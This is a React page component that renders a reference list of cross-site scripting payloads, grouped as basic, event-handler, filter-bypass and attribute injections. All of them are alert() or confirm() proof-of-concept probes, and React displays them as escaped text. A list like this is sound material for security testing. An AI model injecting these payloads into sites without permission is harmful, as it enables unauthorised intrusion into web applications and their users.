import Header from "../../../components/Header";
import Footer from "../../../components/Footer";
import MobileMenu from "../../../components/MobileMenu";
import { useState } from "react";
import { motion } from "framer-motion";

export default function XSSPayloads() {
  const [menuOpen, setMenuOpen] = useState(false);
  const toggleMenu = () => setMenuOpen(!menuOpen);

  const payloads = [
    {
      category: "Basic XSS",
      list: [
        `<script>alert('XSS')</script>`,
        `"><script>alert('XSS')</script>`,
        `<img src=x onerror=alert(1)>`
      ]
    },
    {
      category: "Event Handlers",
      list: [
        `<div onmouseover=alert('XSS')>Hover me</div>`,
        `<svg onload=alert(1)>`,
        `<input onfocus=alert(1) autofocus>`
      ]
    },
    {
      category: "Bypass Filters",
      list: [
        `<scr<script>ipt>alert('XSS')</scr<script>ipt>`,
        `<iframe src="javascript:alert(1)">`,
        `"><svg onload=confirm(1)>`
      ]
    },
    {
      category: "XSS in Attributes",
      list: [
        `<a href="javascript:alert(1)">Click me</a>`,
        `<body onload=alert('XSS')>`,
        `<form action="javascript:alert(1)">`
      ]
    }
  ];

  return (
    <div className="bg-gray-50 text-gray-900 font-mono min-h-screen">
      <Header toggleMenu={toggleMenu} />
      {menuOpen && <MobileMenu />}

      <main className="max-w-3xl mx-auto p-4">
        <motion.h1
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          className="text-3xl font-bold text-blue-600 mt-6"
        >
          XSS Payloads
        </motion.h1>

        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.3 }}
          className="mt-6 space-y-6"
        >
          {payloads.map((section, idx) => (
            <div key={idx}>
              <h2 className="text-xl font-semibold text-blue-500">{section.category}</h2>
              <ul className="list-disc list-inside ml-4 mt-2 space-y-1">
                {section.list.map((item, i) => (
                  <li key={i}>
                    <code className="bg-gray-200 px-2 py-1 rounded text-sm">{item}</code>
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </motion.div>
      </main>

      <Footer />
    </div>
  );
}
